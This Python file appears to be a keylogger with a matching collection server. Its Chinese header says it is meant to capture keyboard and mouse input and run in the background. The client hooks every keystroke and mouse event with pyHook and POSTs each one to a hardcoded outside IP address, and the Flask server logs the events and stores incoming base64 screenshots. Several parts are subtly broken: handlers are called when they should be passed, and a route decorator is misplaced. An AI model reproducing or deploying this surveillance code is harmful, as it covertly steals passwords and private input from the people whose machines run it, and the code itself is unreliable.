#!/usr/bin/env python3
# -*- coding-utf-8 -*-

'''
需求：
1. 截获键盘与鼠标操作
2. 截获信息后，转换为JSON 格式，通过HTTP 发送到服务器
3. 后台运行python 脚本（可考虑添加后台服务）
'''
import json
import fire
from loguru import logger

import pyHook
import pythoncom
from http.client import HTTPConnection

headers = {
    "Content-Type": "application/json"
}

event_json = '/server_json'

class KeysetAMouse(object):
    """
    A class that represents a IP address

    Example:
        python keyset_a_mouse.py
        # python keyset_a_mouse.py main
        # python3 keyset_a_mouse.py show_ips --ips_filepath /tmp/ips.txt
    """
    def __init__(self, host = None, hosts = None):
        self.host = host
        self.hosts = hosts

    def OnKeyboardEvent(self, ip, event):
        key_board_event = {
            'MessageType':'KeyboardEvent',
            'MessageName':event.MessageName,
            'Time':event.Time,
            'Key':event.Key
        }
        self.http_post_json(ip, key_board_event)
        return True

    def OnMouseEvent(self, ip, event):
        mouse_event = {
            'MessageType':'MouseEvent',
            'MessageName':event.MessageName,
            'Time':event.Time,
            'Position':event.Position # event.Wheel
        }
        self.http_post_json(ip, mouse_event)
        return True

    def OnEvent(self, ip = '202.100.1.224'):
        hm = pyHook.HookManager() # create a hook manager
        hm.KeyDown = self.OnKeyboardEvent(ip) # watch for all keyboard events
        hm.HookKeyboard() # set the hook
        hm.MouseAll = self.OnMouseEvent(ip) # watch for all mouse events
        hm.HookMouse() # set the hook
        pythoncom.PumpMessages() # wait forever

    def http_post_json(self, ip, dict_data, port = 5000):
        client = HTTPConnection(ip, port = port)
        post_json_data = json.dumps(dict_data).encode('utf-8')
        # client.request('POST', '/cgi-bin/keyset_mouse.py', body = post_json_data, headers = headers)
        client.request('POST', event_json, body = post_json_data, headers = headers)

    def flask_client_json(self, ip = '202.100.1.224'):
        json_data = {
            "from": "akjflw",
            "to": "fjlakdj",
            "amount": 3
        }
        self.http_post_json(ip, json_data)

    def main(self):
        self.OnEvent()

if __name__ == '__main__':
    fire.Fire(KeysetAMouse)


# # 服务端，需分开
import base64
import datetime
# import fire
# from loguru import logger 

from flask import request, Flask

class FlaskServerJson(object):
    node = Flask(__name__)
    @node.route(event_json, methods = ['POST'])

    def __init__(self) -> None:
        pass

    def b64_img(self, b64):
        b4code = bytes(b64, 'utf-8')
        img = base64.b64decode(b4code)
        return img
    
    def flask_server_json(self):
        if request.method == 'POST':
            json_data = request.get_json()
            if json_data['MessageType'] == 'ImageEvent':
                filename = datetime.now().strftime("%Y-%m-%d %H:%M:%S")+'.bmp'
                recv_image = open(filename, 'wb')
                # logger.info(b64_img(json_data['Imageb64']))
                b4code = bytes(json_data['Imageb64'], 'utf-8')
                img = base64.b64decode(b4code)
                recv_image.write(img)
                recv_image.close()
            else:
                logger.info(json_data)
            logger.info('got data')
            return

    def main(self):
        node = FlaskServerJson
        node.run(host = '0.0.0.0')

# if __name__ == '__main__':
#     fire.Fire(FlaskServerJson)
